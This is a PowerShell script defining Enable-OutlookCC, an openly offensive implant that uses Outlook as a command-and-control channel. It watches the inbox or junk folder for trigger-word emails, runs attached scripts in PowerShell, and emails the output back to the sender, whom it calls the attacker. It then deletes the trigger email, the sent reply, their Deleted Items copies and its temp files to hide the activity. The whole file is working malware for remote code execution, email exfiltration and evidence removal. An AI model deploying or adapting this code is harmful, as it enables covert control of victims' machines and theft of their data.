<#
.Synopsis
   Monitors outlook for command and control messages & scripts, then executes them and exfils the data.
.DESCRIPTION
   Monitors outlook for a specified email message.  Once recieved, it will read the contents of its attachment, and run it in powershell.  The output will be momentarily saved to the user's temp folder, then emailed back to the sender.
   The script then deletes the temp file, the trigger email, and the sent email.  It also removes both emails from the deleted items folder, before returning to it's listening state.  As outlook is suspicious of .ps1 files, tasking should have a .txt extension.
,NOTES
    Name: Enable-OutlookCC 
    Author: Andrew Cole
    Company: Chiron Technology Services Inc
    DateCreated: 06/15/2015
.EXAMPLE
   Enable-OutlookCC -Triggerwords Task,Order,Transportation -Delay 5

   This will monitor the users Inbox for a message with a body containing the words Task, Order, and Transportation.  Once detected, the script will run the attached .txt file, and return the results to the senders email, and clean up the evidence.
.EXAMPLE
   Enable-OutlookCC -Junk -Triggerwords Task,Order,Transportation -Delay 5

   This example does the same as above, but monitors the user's junk folder rather than the inbox.
#>
function Enable-OutlookCC
{
    [CmdletBinding()]
    Param
    (
        # Sets the script to monitor the user's junk folder, otherwise, the inbox is monitored
        [Parameter(Mandatory=$false)]
        [switch]$Junk,

        # The time to wait between mailbox sweeps
        [Parameter(Mandatory=$true)]
        $Delay,

        # The exact trigger which starts the payload
        [Parameter(Mandatory=$true)]
        [ValidateCount(3,3)]
        [string[]]$Triggerwords
    )
    Begin # Define target folder parameters
    { 
        $olFolderSent = 5
        $olFolderDeleted = 3
        if($Junk)
        {
            $olFolderNumber = 23
        }
        else
        {
            $olFolderNumber = 6
        }
    }
    Process 
    {
         While($true)
        {
            # Search the Target folder for a trigger email
            $outlook = new-object -com outlook.application;
            $ns = $outlook.GetNameSpace("MAPI");
            write-verbose "Starting mailbox search"
            # Search the desired folder for a trigger email and execute
            $Folder = $ns.GetDefaultFolder($olFolderNumber)
            $Emails = $Folder.items
            $Emails | foreach {
                if($_.Body -match $Triggerwords[0] -and $_.Body -match $Triggerwords[1] -and $_.Body -match $Triggerwords[2])
                {
                    Write-Verbose "Trigger email found"
                    $Attacker = $_.SenderEmailAddress
                    $Subject = $_.Subject
                    Write-Verbose "Attacker email is $Attacker and subject is $Subject"
                    $attach = $_.attachments
                    $attach | foreach { $_.saveasfile(("$env:TEMP\~DF1113DF4B1AE98419.TXT")) }
                    $script = Get-Content $env:TEMP\~DF1113DF4B1AE98419.TXT
                    Remove-Item $env:TEMP\~DF1113DF4B1AE98419.TXT
                    Powershell.exe -command $script > $env:temp\~DF1113DF4B1AE98418.TXT
                    $file = "$env:temp\~DF1113DF4B1AE98418.TXT"
                    $mail = $outlook.CreateItem(0)
                    $mail.subject = "Hey"
                    $mail.body = "Here's the file you wanted."
                    $mail.To = "$Attacker"
                    $mail.attachments.add($file)
                    $mail.Send()
                    Remove-Item $env:temp\~DF1113DF4B1AE98418.TXT
                    Write-verbose "Commands executed, output returned, cleaning up now"
                    # delete trigger email
                    $_.Delete()
                    # Delete exfil email from sent items 
                    $sent = $ns.GetDefaultFolder($olfolderSent)
                    $SentEmails = $sent.items
                    $SentEmails | foreach {
                        if($_.subject -match "Hey" -and $_.To -match $Attacker) 
                            { $_.Delete() }
                    }
                    Write-verbose "Emails deleted, cleaning deleted items folder now"
                    # Remove trigger and exfil emails from Deleted Items
                    $deleted = $ns.GetDefaultFolder($olFolderDeleted)
                    $DEmails = $deleted.items
                    $DEmails | foreach { 
                        if($_.SenderEmailAddress -match $Attacker -and $_.subject -match $Subject) 
                            { $_.Delete() }
                        elseif($_.subject -match 'Hey' -and $_.To -match $Attacker)
                            { $_.Delete() }
                    }
                    Write-verbose "Cleanup complete, returning to monitoring loop"
                }
            }
        Write-Verbose "Trigger email not present, starting sleep cycle of $Delay seconds"
        start-sleep $Delay
        }
    }
    End {}
}